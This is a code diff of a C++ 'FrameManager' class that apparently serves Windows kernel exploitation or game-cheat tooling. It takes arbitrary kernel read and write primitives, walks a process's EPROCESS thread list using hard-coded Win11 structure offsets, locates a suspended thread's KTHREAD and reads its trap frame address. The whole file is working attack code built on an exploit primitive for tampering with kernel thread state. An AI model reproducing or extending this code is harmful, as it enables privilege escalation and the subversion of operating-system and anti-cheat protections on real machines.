@@ -1,9 +1,6 @@
 #include "framemanager.h"
+#include "offsets.h"
 
-// Win11 x64 — verify against current dump.cs
-static const UINT64 OFF_THREAD_LIST_HEAD   = 0x370; // EPROCESS->ThreadListHead (Win11 26100)
-static const UINT64 OFF_KTHREAD_LIST_ENTRY = 0x2f8; // KTHREAD->ThreadListEntry (Win11 26100)
-static const UINT64 OFF_CID_UNIQUE_THREAD  = 0x4B8; // ETHREAD->Cid.UniqueThread
 
 static bool IsValidKernelAddress(UINT64 addr) {
     return addr >= 0xFFFF800000000000ULL && addr <= 0xFFFFFFFFFFFFFFF0ULL;
@@ -11,7 +8,7 @@ static bool IsValidKernelAddress(UINT64 addr) {
 
 
 FrameManager::FrameManager()
-    : threadHandle(nullptr), threadId(0), frameAddress(0), ktrapFrameOffset(0), eprocess(0)
+    : threadHandle(nullptr), threadId(0), frameAddress(0), eprocess(0)
 {}
 
 void FrameManager::SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64)> fn) {
@@ -22,18 +19,12 @@ void FrameManager::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn) {
     writeFn = fn;
 }
 
-void FrameManager::SetTrapFrameOffset(UINT64 offset) {
-    ktrapFrameOffset = offset;
-}
-
 void FrameManager::SetEPROCESS(UINT64 ep) {
-    DbgLog("[FrameManager::SetEPROCESS] eprocess=0x%llX\n", ep);
     eprocess = ep;
 }
 
 
 DWORD WINAPI FrameManager::DummyThreadProc(LPVOID) {
-    SuspendThread(GetCurrentThread());
     return 0;
 }
 
@@ -46,17 +37,24 @@ UINT64 FrameManager::FindKthread() {
         DbgLog("[FindKthread] FAIL: readFn not set\n");
         return 0;
     }
+	if (!threadId) {
+		DbgLog("[FindKthread] FAIL: thread not created\n");
+		return 0;
+	}
 
-    UINT64 listHead = eprocess + OFF_THREAD_LIST_HEAD;
+    UINT64 listHead = eprocess + OFF_EPROCESS_THREAD_LIST_HEAD;
     if (!IsValidKernelAddress(listHead)) {
         DbgLog("[FindKthread] FAIL: listHead=0x%llX is not a valid kernel address\n", listHead);
         return 0;
     }
+
+
     UINT64 flink = 0;
     readFn(&flink, listHead, sizeof(UINT64));
 
     DbgLog("[FindKthread] EPROCESS=0x%llX ThreadListHead=0x%llX flink=0x%llX tid=%lu\n",
         eprocess, listHead, flink, threadId);
+
 
     UINT64 current = flink;
     for (int i = 0; i < 4096; i++) {
@@ -65,7 +63,7 @@ UINT64 FrameManager::FindKthread() {
             return 0;
         }
 
-        UINT64 ethread = current - OFF_KTHREAD_LIST_ENTRY;
+        UINT64 ethread = current - OFF_ETHREAD_THREAD_LIST_HEAD;
         if (!IsValidKernelAddress(ethread)) {
             DbgLog("[FindKthread] FAIL: ethread=0x%llX invalid at entry %d\n", ethread, i);
             return 0;
@@ -91,12 +89,14 @@ UINT64 FrameManager::FindKthread() {
     }
 
     DbgLog("[FindKthread] FAIL: hit 4096 entry limit\n");
+
     return 0;
 }
 
 void FrameManager::CreateFrozenThread() {
     DWORD dwTid = 0;
-    threadHandle = CreateThread(nullptr, 0, DummyThreadProc, nullptr, 0, &dwTid);
+    threadHandle = CreateThread(NULL, 0, DummyThreadProc, NULL, CREATE_SUSPENDED, &dwTid);
+
     if (!threadHandle) {
         DbgLog("[CreateFrozenThread] FAIL: CreateThread failed GLE=%lu\n", GetLastError());
         return;
@@ -120,14 +120,14 @@ void FrameManager::StoreFrame() {
     }
 
     frameAddress = 0;
-    UINT64 trapFrameAddr = kthread + ktrapFrameOffset;
+    UINT64 trapFrameAddr = kthread + OFF_KTHREAD_TRAP_FRAME;
     if (!IsValidKernelAddress(trapFrameAddr)) {
         DbgLog("[StoreFrame] FAIL: trapFrameAddr=0x%llX invalid\n", trapFrameAddr);
         return;
     }
     readFn(&frameAddress, trapFrameAddr, sizeof(UINT64));
     DbgLog("[StoreFrame] kthread=0x%llX ktrapFrameOffset=0x%llX frameAddress=0x%llX\n",
-        kthread, ktrapFrameOffset, frameAddress);
+        kthread, OFF_KTHREAD_TRAP_FRAME, frameAddress);
 
     if (!frameAddress) {
         DbgLog("[StoreFrame] WARN: frameAddress is 0, trap frame may not be set yet\n");
